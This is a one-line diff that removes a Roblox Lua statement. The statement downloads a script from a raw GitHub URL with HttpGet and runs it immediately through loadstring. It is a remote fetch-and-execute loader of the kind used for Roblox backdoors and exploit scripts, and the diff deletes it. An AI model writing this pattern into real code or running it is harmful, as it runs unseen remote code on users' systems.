@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/CJFabro8/HAHAHA/main/Nice%20try'),true))()
